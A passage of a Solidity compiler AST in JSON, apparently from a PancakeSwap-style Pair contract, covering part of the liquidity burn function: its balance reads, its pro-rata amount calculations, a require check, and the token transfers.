														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7949:56:6"
											},
											{
												"assignments": [
													1695
												],
												"declarations": [
													{
														"constant": false,
														"id": 1695,
														"name": "balance1",
														"nodeType": "VariableDeclaration",
														"scope": 1820,
														"src": "8015:13:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1694,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "8015:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1704,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1701,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2355,
																	"src": "8065:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Pair_$2193",
																		"typeString": "contract Pair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Pair_$2193",
																		"typeString": "contract Pair"
																	}
																],
																"id": 1700,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "8057:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1702,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8057:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1697,
																	"name": "_token1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1680,
																	"src": "8038:7:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1696,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 533,
																"src": "8031:6:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1698,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8031:15:6",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$533",
																"typeString": "contract IERC20"
															}
														},
														"id": 1699,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 494,
														"src": "8031:25:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 1703,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8031:40:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8015:56:6"
											},
											{
												"assignments": [
													1706
												],
												"declarations": [
													{
														"constant": false,
														"id": 1706,
														"name": "liquidity",
														"nodeType": "VariableDeclaration",
														"scope": 1820,
														"src": "8081:14:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1705,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "8081:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1712,
												"initialValue": {
													"argumentTypes": null,
													"baseExpression": {
														"argumentTypes": null,
														"id": 1707,
														"name": "balanceOf",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 23,
														"src": "8098:9:6",
														"typeDescriptions": {
															"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
															"typeString": "mapping(address => uint256)"
														}
													},
													"id": 1711,
													"indexExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 1709,
																"name": "this",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2355,
																"src": "8116:4:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_Pair_$2193",
																	"typeString": "contract Pair"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_contract$_Pair_$2193",
																	"typeString": "contract Pair"
																}
															],
															"id": 1708,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "8108:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_address_$",
																"typeString": "type(address)"
															},
															"typeName": "address"
														},
														"id": 1710,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "8108:13:6",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "IndexAccess",
													"src": "8098:24:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8081:41:6"
											},
											{
												"assignments": [
													1714
												],
												"declarations": [
													{
														"constant": false,
														"id": 1714,
														"name": "feeOn",
														"nodeType": "VariableDeclaration",
														"scope": 1820,
														"src": "8133:10:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 1713,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "8133:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1719,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1716,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1669,
															"src": "8155:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1717,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1671,
															"src": "8166:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1715,
														"name": "_mintFee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1367,
														"src": "8146:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint112_$_t_uint112_$returns$_t_bool_$",
															"typeString": "function (uint112,uint112) returns (bool)"
														}
													},
													"id": 1718,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8146:30:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8133:43:6"
											},
											{
												"assignments": [
													1721
												],
												"declarations": [
													{
														"constant": false,
														"id": 1721,
														"name": "_totalSupply",
														"nodeType": "VariableDeclaration",
														"scope": 1820,
														"src": "8186:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1720,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "8186:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1723,
												"initialValue": {
													"argumentTypes": null,
													"id": 1722,
													"name": "totalSupply",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 19,
													"src": "8206:11:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8186:31:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1731,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1724,
														"name": "amount0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1664,
														"src": "8305:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 1730,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1727,
																	"name": "balance0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1684,
																	"src": "8329:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 1725,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1706,
																	"src": "8315:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1726,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "mul",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2267,
																"src": "8315:13:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 1728,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8315:23:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "/",
														"rightExpression": {
															"argumentTypes": null,
															"id": 1729,
															"name": "_totalSupply",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1721,
															"src": "8341:12:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "8315:38:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "8305:48:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1732,
												"nodeType": "ExpressionStatement",
												"src": "8305:48:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1740,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1733,
														"name": "amount1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1666,
														"src": "8411:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 1739,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1736,
																	"name": "balance1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1695,
																	"src": "8435:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 1734,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1706,
																	"src": "8421:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1735,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "mul",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2267,
																"src": "8421:13:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 1737,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8421:23:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "/",
														"rightExpression": {
															"argumentTypes": null,
															"id": 1738,
															"name": "_totalSupply",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1721,
															"src": "8447:12:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "8421:38:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "8411:48:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1741,
												"nodeType": "ExpressionStatement",
												"src": "8411:48:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 1749,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1745,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1743,
																	"name": "amount0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1664,
																	"src": "8538:7:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 1744,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "8548:1:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "8538:11:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "&&",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1748,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1746,
																	"name": "amount1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1666,
																	"src": "8553:7:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 1747,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "8563:1:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "8553:11:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "8538:26:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544",
															"id": 1750,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8578:40:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_6c050b0a8d3f2d18d11271ee0a551b7748437b8fa9a6165c561190d34a2947d6",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_LIQUIDITY_BURNED\""
															},
															"value": "Pancake: INSUFFICIENT_LIQUIDITY_BURNED"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_6c050b0a8d3f2d18d11271ee0a551b7748437b8fa9a6165c561190d34a2947d6",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_LIQUIDITY_BURNED\""
															}
														],
														"id": 1742,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2328,
															2329
														],
														"referencedDeclaration": 2329,
														"src": "8517:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1751,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8517:111:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1752,
												"nodeType": "ExpressionStatement",
												"src": "8517:111:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1755,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2355,
																	"src": "8652:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Pair_$2193",
																		"typeString": "contract Pair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Pair_$2193",
																		"typeString": "contract Pair"
																	}
																],
																"id": 1754,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "8644:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1756,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8644:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1757,
															"name": "liquidity",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1706,
															"src": "8659:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1753,
														"name": "_burn",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 206,
														"src": "8638:5:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,uint256)"
														}
													},
													"id": 1758,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8638:31:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1759,
												"nodeType": "ExpressionStatement",
												"src": "8638:31:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1761,
															"name": "_token0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1676,
															"src": "8693:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1762,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1659,
															"src": "8702:2:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1763,
															"name": "amount0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1664,
															"src": "8706:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1760,
														"name": "_safeTransfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1070,
														"src": "8679:13:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 1764,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8679:35:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1765,
												"nodeType": "ExpressionStatement",
												"src": "8679:35:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1767,
															"name": "_token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1680,
															"src": "8738:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1768,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1659,
															"src": "8747:2:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1769,
															"name": "amount1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1666,
															"src": "8751:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1766,
														"name": "_safeTransfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1070,
														"src": "8724:13:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 1770,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8724:35:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1771,
												"nodeType": "ExpressionStatement",
												"src": "8724:35:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1781,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1772,
														"name": "balance0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1684,
														"src": "8769:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1778,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 2355,
																		"src": "8814:4:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_Pair_$2193",
																			"typeString": "contract Pair"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_Pair_$2193",
																			"typeString": "contract Pair"
																		}
																	],
																	"id": 1777,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "8806:7:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 1779,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "8806:13:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1774,
																		"name": "_token0",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1676,
																		"src": "8787:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"id": 1773,
																	"name": "IERC20",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 533,
																	"src": "8780:6:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																		"typeString": "type(contract IERC20)"
																	}
																},
																"id": 1775,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "8780:15:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_IERC20_$533",
																	"typeString": "contract IERC20"
																}
															},
															"id": 1776,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balanceOf",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 494,
															"src": "8780:25:6",
															"typeDescriptions": {
																"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																"typeString": "function (address) view external returns (uint256)"
															}
														},
														"id": 1780,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "8780:40:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "8769:51:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1782,
												"nodeType": "ExpressionStatement",
												"src": "8769:51:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1792,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1783,
														"name": "balance1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1695,
														"src": "8830:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
